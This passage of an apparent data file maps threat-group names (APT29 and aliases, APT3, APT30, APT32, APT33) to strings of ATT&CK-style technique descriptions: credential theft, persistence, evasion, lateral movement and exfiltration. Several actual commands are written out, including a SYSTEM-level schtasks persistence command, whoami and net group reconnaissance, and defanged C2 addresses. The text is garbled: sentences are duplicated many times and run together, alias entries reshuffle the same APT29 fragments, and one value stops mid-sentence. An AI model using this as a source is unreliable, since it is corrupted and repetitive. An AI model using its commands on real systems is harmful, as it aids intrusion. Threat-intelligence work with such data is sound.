Compromise, APT29 used compromised identities to access networks via SSH, VPNs, and other remote access tools., During the SolarWinds Compromise, APT29 obtained information about the configured Exchange virtual directory using Get-WebServicesVirtualDirectory., During the SolarWinds Compromise, APT29 bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key., During the SolarWinds Compromise, APT29 created tokens using compromised SAML signing certificates., For the SolarWinds Compromise, APT29 conducted credential theft operations to obtain credentials to be used for access to victim environments., APT29 uses compromised residential endpoints, typically within the same ISP IP address range, as proxies to hide the true source of C2 traffic.During the SolarWinds Compromise, APT29 set the hostnames of their C2 infrastructure to match legitimate hostnames in the victim environment. They also used IP addresses originating from the same country as the victim for their VPN infrastructure., During the SolarWinds Compromise, APT29 set the hostnames of their C2 infrastructure to match legitimate hostnames in the victim environment. They also used IP addresses originating from the same country as the victim for their VPN infrastructure., During the SolarWinds Compromise, APT29 used the service control manager on a remote system to disable services associated with security monitoring products., During the SolarWinds Compromise, APT29, used AUDITPOL to prevent the collection of audit logs., During the SolarWinds Compromise, APT29 used netsh to configure firewall rules that limited certain UDP outbound packets., APT29 has disabled Purview Audit on targeted accounts prior to stealing emails from  Microsoft 365 tenants., APT29 has used SDelete to remove artifacts from victim networks.During the SolarWinds Compromise, APT29 routinely removed their tools, including custom backdoors, once remote access was achieved., During the SolarWinds Compromise, APT29 routinely removed their tools, including custom backdoors, once remote access was achieved., APT29 has used timestomping to alter the Standard Information timestamps on their web shells to match other files in the same directory.During the SolarWinds Compromise, APT29 modified timestamps of backdoors to match legitimate Windows files., During the SolarWinds Compromise, APT29 modified timestamps of backdoors to match legitimate Windows files., During the SolarWinds Compromise, APT29 removed evidence of email export requests using Remove-MailboxExportRequest., APT29 has downloaded additional tools and malware onto compromised networks.During the SolarWinds Compromise, APT29 downloaded additional malware, such as TEARDROP and Cobalt Strike, onto a compromised host following initial access., During the SolarWinds Compromise, APT29 downloaded additional malware, such as TEARDROP and Cobalt Strike, onto a compromised host following initial access., During the SolarWinds Compromise, APT29 named tasks /Microsoft/Windows/SoftwareProtectionPlatform/EventCacheManager in order to appear legitimate., APT29 has renamed malicious DLLs with legitimate names to appear benign; they have also created an Azure AD certificate with a Common Name that matched the display name of the compromised service principal.During the SolarWinds Compromise, APT29 renamed software and DLLs with legitimate names to appear benign., During the SolarWinds Compromise, APT29 renamed software and DLLs with legitimate names to appear benign., APT29 has edited the Microsoft.IdentityServer.Servicehost.exe.config file to load a malicious DLL into the AD FS process, thereby enabling persistent access to any service federated with AD FS for a user with a specified User Principal Name., APT29 has used repeated MFA requests to gain access to victim accounts., APT29 used large size files to avoid detection by security solutions with hardcoded size limits., APT29 used UPX to pack files., During Operation Ghost, APT29 used steganography to hide payloads inside valid images., APT29 has embedded an ISO file within an HTML attachment that contained JavaScript code to initiate malware execution. , APT29 has obtained and used a variety of tools including Mimikatz, SDelete, Tor, meek, and Cobalt Strike., APT29 has used the reg save command to save registry hives., APT29 has used the reg save command to extract LSA secrets offline., During the SolarWinds Compromise, APT29 used privileged accounts to replicate directory service data with domain controllers., During the SolarWinds Compromise, APT29 used AdFind to enumerate domain groups., APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims., APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files., APT29 has used the legitimate mailing service Constant Contact to send phishing e-mails., During the SolarWinds Compromise, APT29 used multiple command-line utilities to enumerate running processes., During the SolarWinds Compromise, APT29 used SSH port forwarding capabilities on public-facing systems, and configured at least one instance of Cobalt Strike to use a network pipe over SMB., APT29 uses compromised residential endpoints as proxies for defense evasion and network access., A backdoor used by APT29 created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network and has also used TOR., APT29 has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic., During the SolarWinds Compromise, APT29 used RDP sessions from public-facing systems to internal servers., During the SolarWinds Compromise, APT29 used administrative accounts to connect over SMB to targeted users., During the SolarWinds Compromise, APT29 used WinRM via PowerShell to execute commands and payloads on remote hosts., APT29 has leveraged compromised high-privileged on-premises accounts synced to Office 365 to move laterally into a cloud environment, including through the use of Azure AD PowerShell., During the SolarWinds Compromise, APT29 used AdFind to enumerate remote systems., APT29 has used named and hijacked scheduled tasks to establish persistence.During the SolarWinds Compromise, APT29 used scheduler and schtasks to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted., During the SolarWinds Compromise, APT29 used scheduler and schtasks to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted., APT29 has installed web shells on exploited Microsoft Exchange servers., APT29 uses stolen tokens to access victim accounts, without needing a password., APT29 has abused misconfigured AD CS certificate templates to impersonate admin users and create additional authentication certificates., During the SolarWinds Compromise, APT29 obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline., During the SolarWinds Compromise, APT29 stole Chrome browser cookies by copying the Chrome profile directories of targeted users., During the SolarWinds Compromise, APT29 was able to get SUNBURST signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle., APT29 has embedded ISO images and VHDX files in HTML to evade Mark-of-the-Web., During the SolarWinds Compromise, APT29 gained initial network access to some victims via a trojanized update of SolarWinds Orion software., APT29 has use mshta to execute malicious scripts on a compromised host., During the SolarWinds Compromise, APT29 used Rundll32.exe to execute payloads., During the SolarWinds Compromise, APT29 used fsutil to check available free space before executing actions that might create large files on disk., APT29 has ensured web servers in a victim environment are Internet accessible before copying tools or malware to it.During the SolarWinds Compromise, APT29 used GoldFinder to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through., During the SolarWinds Compromise, APT29 used GoldFinder to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through., APT29 has compromised IT, cloud services, and managed services providers to gain broad access to multiple customers for subsequent operations.During the SolarWinds Compromise, APT29 gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems., During the SolarWinds Compromise, APT29 gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems., During the SolarWinds Compromise, APT29 obtained PKI keys, certificate files, and the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates., During the SolarWinds Compromise, APT29 used compromised service principals to make changes to the Office 365 environment., APT29 used Kerberos ticket attacks for lateral movement., During the SolarWinds Compromise, APT29 used stolen cookies to access cloud resources and a forged duo-sid cookie to bypass MFA set on an email account., APT29 has used various forms of spearphishing attempting to get a user to click on a malicious link., APT29 has used various forms of spearphishing attempting to get a user to open attachments, including, but not limited to, malicious Microsoft Word documents, .pdf, and .lnk files. , APT29 has used a compromised account to access an organization's VPN infrastructure.During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally., During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally., During the SolarWinds Compromise, APT29 used domain administrators' accounts to help facilitate lateral movement on compromised networks.For Operation Ghost, APT29 used stolen administrator credentials for lateral movement on compromised networks., For Operation Ghost, APT29 used stolen administrator credentials for lateral movement on compromised networks., APT29 targets dormant or inactive user accounts, accounts belonging to individuals no longer at the organization but whose accounts remain on the system, for access and persistence.During the SolarWinds Compromise, APT29 used compromised local accounts to access victims' networks., During the SolarWinds Compromise, APT29 used compromised local accounts to access victims' networks., APT29 has gained access to a global administrator account in Azure AD and has used Service Principal credentials in Exchange.During the SolarWinds Compromise, APT29 used a compromised O365 administrator account to create a new Service Principal., During the SolarWinds Compromise, APT29 used a compromised O365 administrator account to create a new Service Principal., For Operation Ghost, APT29 used social media platforms to hide communications to C2 servers., APT29 used WMI to steal credentials and execute backdoors at a future time.During the SolarWinds Compromise, APT29 used WMI for the remote execution of files for lateral movement., During the SolarWinds Compromise, APT29 used WMI for the remote execution of files for lateral movement.",
    "IRON RITUAL": "APT29 is threat group that has been attributed to Russia's Foreign Intelligence Service (SVR). They have operated since at least 2008, often targeting government networks in Europe and NATO member countries, research institutes, and think tanks. APT29 reportedly compromised the Democratic National Committee starting in the summer of 2015., In April 2021, the US and UK governments attributed the SolarWinds Compromise to the SVR; public statements included citations to APT29, Cozy Bear, and The Dukes. Industry reporting also referred to the actors involved in this campaign as UNC2452, NOBELIUM, StellarParticle, Dark Halo, and SolarStorm., , , , , , , , , , , , , , , , , APT29 has bypassed UAC., During the SolarWinds Compromise, APT29 used PowerShell to discover domain accounts by exectuing Get-ADUser and Get-ADGroupMember., APT29 has conducted enumeration of Azure AD accounts., During the SolarWinds Compromise, APT29 added credentials to OAuth Applications and Service Principals., APT29 has used a compromised global administrator account in Azure AD to backdoor a service principal with ApplicationImpersonation rights to start collecting emails from targeted mailboxes; APT29 has also used compromised accounts holding ApplicationImpersonation rights in Exchange to collect emails.During the SolarWinds Compromise, APT29 added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals., During the SolarWinds Compromise, APT29 added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals., During the SolarWinds Compromise, APT29 granted company administrator privileges to a newly created service principle., APT29 has enrolled their own devices into compromised cloud tenants, including enrolling a device in MFA to an Azure AD environment following a successful password guessing attack against a dormant account.During the SolarWinds Compromise, APT29 registered devices in order to enable mailbox syncing via the Set-CASMailbox command., During the SolarWinds Compromise, APT29 registered devices in order to enable mailbox syncing via the Set-CASMailbox command., For the SolarWinds Compromise, APT29 acquired C2 domains, sometimes through resellers.For Operation Ghost, APT29 registered domains for use in C2 including some crafted to appear as existing legitimate domains., For Operation Ghost, APT29 registered domains for use in C2 including some crafted to appear as existing legitimate domains., APT29 has registered algorithmically generated Twitter handles that are used for C2 by malware, such as HAMMERTOSS. APT29 has also used legitimate web services such as Dropbox and Constant Contact in their operations., APT29 has conducted widespread scanning of target environments to identify vulnerabilities for exploit., During the SolarWinds Compromise, APT29 used HTTP for C2 and data exfiltration., During the SolarWinds Compromise, APT29 used 7-Zip to compress stolen emails into password-protected archives prior to exfltration; APT29 also compressed text files into zipped archives., APT29 added Registry Run keys to establish persistence., APT29 has hijacked legitimate application-specific startup scripts to enable malware to execute on system startup., APT29 has installed a run command on a compromised system to enable malware execution on system startup., APT29 has successfully conducted password guessing attacks against a list of mailboxes., APT29 has conducted brute force password spray attacks., APT29 has used Azure Run Command and Azure Admin-on-Behalf-of (AOBO) to execute code on virtual machines., APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke.During the SolarWinds Compromise, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands., During the SolarWinds Compromise, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands., During the SolarWinds Compromise, APT29 used cmd.exe to execute commands on remote machines., For the SolarWinds Compromise, APT29 wrote malware such as Sibot in Visual Basic., APT29 has developed malware variants written in Python., APT29 has leveraged the Microsoft Graph API to perform various actions across Azure and M365 environments. They have also utilized AADInternals PowerShell Modules to access the API , APT29 has compromised email accounts to further enable phishing campaigns and taken control of dormant accounts., APT29 has used residential proxies, including Azure Virtual Machines, to obfuscate their access to victim environments., For the SolarWinds Compromise, APT29 compromised domains to use for C2.",
    "IRON HEMLOCK": " During the SolarWinds Compromise, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands., During the SolarWinds Compromise, APT29 used cmd.exe to execute commands on remote machines., For the SolarWinds Compromise, APT29 wrote malware such as Sibot in Visual Basic., APT29 has developed malware variants written in Python., APT29 has leveraged the Microsoft Graph API to perform various actions across Azure and M365 environments. They have also utilized AADInternals PowerShell Modules to access the API , APT29 has compromised email accounts to further enable phishing campaigns and taken control of dormant accounts., APT29 has used residential proxies, including Azure Virtual Machines, to obfuscate their access to victim environments., For the SolarWinds Compromise, APT29 compromised domains to use for C2., APT29 can create new users through Azure AD., During the SolarWinds Compromise, APT29 stole users' saved passwords from Chrome., During the SolarWinds Compromise, APT29 accessed victims' internal knowledge repositories (wikis) to view sensitive corporate information on products, services, and internal business operations., During the SolarWinds Compromise, APT29 downloaded source code from code repositories., APT29 has stolen data from compromised hosts.During the SolarWinds Compromise, APT29 extracted files from compromised networks., During the SolarWinds Compromise, APT29 extracted files from compromised networks., During Operation Ghost, APT29 used steganography to hide the communications between the implants and their C&C servers., During the SolarWinds Compromise, APT29 staged data and files in password-protected archives on a victim's OWA server., During the SolarWinds Compromise, APT29 used 7-Zip to decode their Raindrop malware., APT29 has used unique malware in many of their operations.For the SolarWinds Compromise, APT29 used numerous pieces of malware that were likely developed for or by the group, including SUNBURST, SUNSPOT, Raindrop, and TEARDROP. For Operation Ghost, APT29 used new strains of malware including FatDuke, MiniDuke, RegDuke, and PolyglotDuke., For the SolarWinds Compromise, APT29 used numerous pieces of malware that were likely developed for or by the group, including SUNBURST, SUNSPOT, Raindrop, and TEARDROP. , For Operation Ghost, APT29 used new strains of malware including FatDuke, MiniDuke, RegDuke, and PolyglotDuke., APT29 has created self-signed digital certificates to enable mutual TLS authentication for malware., During the SolarWinds Compromise, APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate., During the SolarWinds Compromise, APT29 used the Get-AcceptedDomain PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell. They also used AdFind to enumerate domains and to discover trust between federated domains., APT29 has used Dynamic DNS providers for their malware C2 infrastructure.During the SolarWinds Compromise, APT29 used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2. , During the SolarWinds Compromise, APT29 used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2. , APT29 has collected emails from targeted mailboxes within a compromised Azure AD tenant and compromised Exchange servers, including via Exchange Web Services (EWS) API requests.During the SolarWinds Compromise, APT29 collected emails from specific individuals, such as executives and IT staff, using New-MailboxExportRequest followed by Get-MailboxExportRequest., During the SolarWinds Compromise, APT29 collected emails from specific individuals, such as executives and IT staff, using New-MailboxExportRequest followed by Get-MailboxExportRequest., APT29 has used multiple layers of encryption within malware to protect C2 communication., For Operation Ghost, APT29 registered Twitter accounts to host C2 nodes.",
    "NobleBaron": "During the SolarWinds Compromise, APT29 used compromised service principals to make changes to the Office 365 environment., APT29 used Kerberos ticket attacks for lateral movement., During the SolarWinds Compromise, APT29 used stolen cookies to access cloud resources and a forged duo-sid cookie to bypass MFA set on an email account., APT29 has used various forms of spearphishing attempting to get a user to click on a malicious link., APT29 has used various forms of spearphishing attempting to get a user to open attachments, including, but not limited to, malicious Microsoft Word documents, .pdf, and .lnk files. , APT29 has used a compromised account to access an organization's VPN infrastructure.During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally., During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally., During the SolarWinds Compromise, APT29 used domain administrators' accounts to help facilitate lateral movement on compromised networks.For Operation Ghost, APT29 used stolen administrator credentials for lateral movement on compromised networks., For Operation Ghost, APT29 used stolen administrator credentials for lateral movement on compromised networks., APT29 targets dormant or inactive user accounts, accounts belonging to individuals no longer at the organization but whose accounts remain on the system, for access and persistence.During the SolarWinds Compromise, APT29 used compromised local accounts to access victims' networks., During the SolarWinds Compromise, APT29 used compromised local accounts to access victims' networks., APT29 has gained access to a global administrator account in Azure AD and has used Service Principal credentials in Exchange.During the SolarWinds Compromise, APT29 used a compromised O365 administrator account to create a new Service Principal., During the SolarWinds Compromise, APT29 used a compromised O365 administrator account to create a new Service Principal., For Operation Ghost, APT29 used social media platforms to hide communications to C2 servers., APT29 used WMI to steal credentials and execute backdoors at a future time.During the SolarWinds Compromise, APT29 used WMI for the remote execution of files for lateral movement., During the SolarWinds Compromise, APT29 used WMI for the remote execution of files for lateral movement. During the SolarWinds Compromise, APT29 used PowerShell to discover domain accounts by exectuing Get-ADUser and Get-ADGroupMember., APT29 has conducted enumeration of Azure AD accounts., During the SolarWinds Compromise, APT29 added credentials to OAuth Applications and Service Principals., APT29 has used a compromised global administrator account in Azure AD to backdoor a service principal with ApplicationImpersonation rights to start collecting emails from targeted mailboxes; APT29 has also used compromised accounts holding ApplicationImpersonation rights in Exchange to collect emails.During the SolarWinds Compromise, APT29 added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals., During the SolarWinds Compromise, APT29 added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals., During the SolarWinds Compromise, APT29 granted company administrator privileges to a newly created service principle., APT29 has enrolled their own devices into compromised cloud tenants, including enrolling a device in MFA to an Azure AD environment following a successful password guessing attack against a dormant account.",
    "Dark Halo": "APT29 has also used legitimate web services such as Dropbox and Constant Contact in their operations., APT29 has conducted widespread scanning of target environments to identify vulnerabilities for exploit., During the SolarWinds Compromise, APT29 used HTTP for C2 and data exfiltration., During the SolarWinds Compromise, APT29 used 7-Zip to compress stolen emails into password-protected archives prior to exfltration; APT29 also compressed text files into zipped archives., APT29 added Registry Run keys to establish persistence., APT29 has hijacked legitimate application-specific startup scripts to enable malware to execute on system startup., APT29 has installed a run command on a compromised system to enable malware execution on system startup., APT29 has successfully conducted password guessing attacks against a list of mailboxes., APT29 has conducted brute force password spray attacks., APT29 has used Azure Run Command and Azure Admin-on-Behalf-of (AOBO) to execute code on virtual machines., APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke.During the SolarWinds Compromise, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands., During the SolarWinds Compromise, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands., During the SolarWinds Compromise, APT29 used cmd.exe to execute commands on remote machines., For the SolarWinds Compromise, APT29 wrote malware such as Sibot in Visual Basic., APT29 has developed malware variants written in Python., APT29 has leveraged the Microsoft Graph API to perform various actions across Azure and M365 environments. They have also utilized AADInternals PowerShell Modules to access the API , APT29 has compromised email accounts to further enable phishing campaigns and taken control of dormant accounts., APT29 has used residential proxies, including Azure Virtual Machines, to obfuscate their access to victim environments., For the SolarWinds Compromise, APT29 compromised domains to use for C2., APT29 can create new users through Azure AD., During the SolarWinds Compromise, APT29 stole users' saved passwords from Chrome., During the SolarWinds Compromise, APT29 accessed victims' internal knowledge repositories (wikis) to view sensitive corporate information on products, services, and internal business operations., During the SolarWinds Compromise, APT29 downloaded source code from code repositories., APT29 has stolen data from compromised hosts.During the SolarWinds Compromise",
    "APT3": "APT3 is a China-based threat group that researchers have attributed to China's Ministry of State Security. This group is responsible for the campaigns known as Operation Clandestine Fox, Operation Clandestine Wolf, and Operation Double Tap. As of June 2015, the group appears to have shifted from targeting primarily US victims to primarily political organizations in Hong Kong.,   , ,   , ,  ,  , APT3 has used a tool that can obtain info about local and global group users, power users, and administrators., APT3 has been known to add created accounts to local admin groups to maintain elevated access., APT3 has used tools to compress data before exfilling it., APT3 places scripts in the startup folder for persistence., APT3 has been known to brute force password hashes to be able to leverage plain text credentials., APT3 has used PowerShell on victim systems to download and run payloads after exploitation., An APT3 downloader uses the Windows command 'cmd.exe' /C whoami. The group also uses a tool to execute commands on remote computers., APT3 has been known to create or enable accounts, such as support_388945a0., APT3 has a tool that creates a new service for persistence., APT3 has used tools to dump passwords from browsers., APT3 will identify Microsoft Office documents on the victim's computer., APT3 has been known to stage files for exfiltration in a single location., APT3 replaces the Sticky Keys binary C:/Windows/System32/sethc.exe for persistence., APT3 has a tool that exfiltrates data over the C2 channel., APT3 has exploited the Adobe Flash Player vulnerability CVE-2015-3113 and Internet Explorer vulnerability CVE-2014-1776., APT3 has a tool that looks for files and directories on the local file system., APT3 has been known to use -WindowStyle Hidden to conceal PowerShell windows., APT3 has been known to side load DLLs with a valid version of Chrome with one of their tools., APT3 has a tool that can delete files., APT3 has a tool that can copy files to remote machines., APT3 has used a keylogging tool that records keystrokes in encrypted files., APT3 has been known to create or enable accounts, such as support_388945a0., An APT3 downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81., An APT3 downloader establishes SOCKS5 connections for its initial C2., APT3 obfuscates files or information to help evade defensive measures., APT3 has been known to pack their tools. , APT3 has been known to remove indicators of compromise from tools., APT3 has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument 'dig.', APT3 has a tool that can enumerate the permissions associated with Windows groups., APT3 has sent spearphishing emails containing malicious links., APT3 has a tool that can list out currently running processes., An APT3 downloader establishes SOCKS5 connections for its initial C2., APT3 enables the Remote Desktop Protocol for persistence. APT3 has also interacted with compromised systems to browse and copy files through RDP sessions., APT3 will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement., APT3 has a tool that can detect the existence of remote systems., An APT3 downloader creates persistence by creating the following scheduled task: schtasks /create /tn 'mysc' /tr C:/Users/Public/test.exe /sc ONLOGON /ru 'System'., APT3 has a tool that can run DLLs., APT3 has a tool that can obtain information about the local system., A keylogging tool used by APT3 gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway., APT3 has a tool that can enumerate current network connections., An APT3 downloader uses the Windows command 'cmd.exe' /C whoami to verify that it is running with the elevated privileges of 'System.', APT3 has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome., APT3 has lured victims into clicking malicious links delivered through spearphishing., APT3 leverages valid accounts after gaining credentials for use within the victim domain.",
    "APT30": "APT30 is a threat group suspected to be associated with the Chinese government. While Naikon shares some characteristics with APT30, the two groups do not appear to be exact matches., APT30 has used spearphishing emails with malicious DOC attachments., APT30 has relied on users to execute malicious file attachments delivered via spearphishing emails.",
    "APT32": "APT32 is a suspected Vietnam-based threat group that has been active since at least 2014. The group has targeted multiple private sector industries as well as foreign governments, dissidents, and journalists with a strong focus on Southeast Asian countries like Vietnam, the Philippines, Laos, and Cambodia. They have extensively used strategic web compromises to compromise victims., , , , , , APT32 enumerated administrative users using the commands net localgroup administrators., APT32 has set up and operated websites to gather information and deliver malware., APT32 has set up Dropbox, Amazon S3, and Google Drive to host malicious downloads., APT32 has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP., APT32 has used email for C2 via an Office macro., APT32's backdoor has used LZMA compression and RC4 encryption before exfiltration., APT32 established persistence using Registry Run keys, both to execute PowerShell and VBS scripts as well as to execute their backdoor directly., APT32 has used COM scriptlets to download Cobalt Strike beacons. , APT32 has used PowerShell-based tools, PowerShell one-liners, and shellcode loaders for execution., APT32 has used cmd.exe for execution. , APT32 has used macros, COM scriptlets, and VBS scripts. , APT32 has used JavaScript for drive-by downloads and C2 communications., APT32 modified Windows Services to ensure PowerShell scripts were loaded on the system. APT32 also creates a Windows service to establish persistence., APT32 has infected victims by tricking them into visiting compromised watering hole websites., APT32 has set up Facebook pages in tandem with fake websites., APT32's backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets., APT32's backdoor has exfiltrated data using the already opened channel with its C&C server., APT32 has used RTF document that includes an exploit to execute malicious code. (CVE-2017-11882), APT32 has used CVE-2016-7255 to escalate privileges., APT32's backdoor possesses the capability to list files and directories on a machine.  , APT32's macOS backdoor changes the permission of the file it wants to execute to 755., APT32 has conducted targeted surveillance against activists and bloggers., APT32 has collected e-mail addresses for activists and bloggers in order to target them with spyware., APT32's macOS backdoor hides the clientID file via a chflags function., APT32 has used the WindowStyle parameter to conceal PowerShell windows.  , APT32 used NTFS alternate data streams to hide their payloads., APT32 ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder)., APT32 has cleared select event log entries., APT32's macOS backdoor can receive a 'delete' command., APT32 has used scheduled task raw XML with a backdated timestamp of June 2, 2016. The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll. Additionally, APT32 has used a random value to modify the timestamp of the file storing the clientID., APT32 has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors., APT32 has abused the PasswordChangeNotify to monitor for and capture account password changes., APT32 has deployed tools after moving laterally using administrative accounts. , APT32 has disguised a Cobalt Strike beacon as a Flash Installer., APT32 has moved and renamed pubprn.vbs to a .txt file to avoid detection., APT32 has used hidden or non-printing characters to help masquerade service names, such as appending a Unicode no-break space character to a legitimate service name. APT32 has also impersonated the legitimate Flash installer file name 'install_flashplayer.exe'., APT32 has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update. APT32 has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe. , APT32's backdoor has modified the Windows Registry to store the backdoor's configuration.  , APT32 performed network scanning on the network to search for open ports, services, OS finger-printing, and other vulnerabilities., APT32 used the net view command to show all shares available, including the administrative shares such as C$ and ADMIN$., An APT32 backdoor can use HTTP over a non-standard TCP port (e.g 14146) which is specified in the backdoor configuration., APT32 includes garbage code to mislead anti-malware software and researchers., APT32 has used the Invoke-Obfuscation framework to obfuscate their PowerShell., APT32's backdoor has stored its configuration in a registry key., APT32 has performed code obfuscation, including encoding payloads using Base64 and using a framework called 'Dont-Kill-My-Cat (DKMC). APT32 also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor., APT32 has obtained and used tools such as Mimikatz and Cobalt Strike, and a variety of other open-source tools from GitHub., APT32 have replaced Microsoft Outlook's VbaProject.OTM file to install a backdoor macro for persistence., APT32 used GetPassword_x64 to harvest credentials., APT32 used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials., APT32 has sent spearphishing emails with a malicious executable disguised as a document or spreadsheet., APT32 has sent spearphishing emails containing malicious links., APT32 has used malicious links to direct users to web pages designed to harvest credentials., APT32 malware has injected a Cobalt Strike beacon into Rundll32.exe., APT32's backdoor can query the Windows Registry to gather system information. , APT32 used Net to use Windows' hidden network shares to copy their tools to remote machines for execution., APT32 has enumerated DC servers using the command net group 'Domain Controllers' /domain. The group has also used the ping command., APT32 has used scheduled tasks to persist on victim systems., APT32 has used Web shells to maintain access to victim websites., APT32 compromised McAfee ePO to move laterally by distributing malware as a software deployment task., APT32 has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting., APT32 has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update., APT32 has used mshta.exe for code execution., APT32 created a Scheduled Task/Job that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor. , APT32 malware has used rundll32.exe to execute an initial infection process., APT32 has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information, and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server. APT32 executed shellcode to identify the name of the infected host., APT32 used the ipconfig /all command to gather the IP address from the system., APT32 used the netstat -anpo tcp command to display TCP connections on the victim's machine., APT32 collected the victim's username and executed the whoami command on the victim's machine. APT32 executed shellcode to collect the username on the victim's machine. , APT32 has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses., APT32's backdoor has used Windows services as a way to execute its malicious payload. , APT32 used Outlook Credential Dumper to harvest credentials stored in Windows registry., APT32 has used pass the hash for lateral movement., APT32 successfully gained remote access by using pass the ticket., APT32 has lured targets to download a Cobalt Strike beacon by including a malicious link within spearphishing emails., APT32 has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment., APT32 has used legitimate local admin account credentials., APT32 has used Dropbox, Amazon S3, and Google Drive to host malicious downloads., APT32 used WMI to deploy their tools on remote machines and to gather information about the Outlook process.",
    "APT33": "APT33 is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors., , , , APT33 has used HTTP for command and control., APT33 has used WinRAR to compress data prior to exfil. , APT33 has deployed a tool known as DarkComet to the Startup folder of a victim, and used Registry run keys to gain persistence., APT33 has used password spraying to gain access to target systems., APT33 has utilized PowerShell to download files from the C2 server and run various scripts. , APT33 has used VBScript to initiate the delivery of payloads., APT33 has used a variety of publicly available tools like LaZagne to gather credentials., APT33 has used a variety of publicly available tools like LaZagne to gather credentials., APT33 has used base64 to encode command and control traffic., APT33 has used AES for encryption of command and control traffic., APT33 has attempted to use WMI event subscriptions to establish persistence on compromised hosts., APT33 has used FTP to exfiltrate files (separately from the C2 channel)., APT33 has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250), and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774)., APT33 has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system., APT33 has downloaded additional files and programs from its C2 server. , APT33 has used SniffPass to collect credentials by sniffing network traffic., APT33 has used HTTP over TCP ports 808 and 880 for command and control., APT33 has used base64 to encode payloads., APT33 has obtained and leveraged publicly-available tools for early intrusion activities., APT33 has used a variety of publicly available tools like LaZagne, Mimikatz, and ProcDump to dump credentials., APT33 has used a variety of publicly available tools like LaZagne to gather credentials., APT33 has used a variety of publicly available tools like LaZagne to gather credentials., APT33 has sent spearphishing e-mails with archive attachments., APT33 has sent spearphishing emails containing links to .hta files., APT33 has created a scheduled task to execute a .vbe file multiple times a day., APT33 has used a variety of publicly available tools like LaZagne to gather credentials., APT33 has used a variety of publicly available tools like Gpppassword to gather credentials., APT33 has lured users to click links to malicious HTML applications delivered via 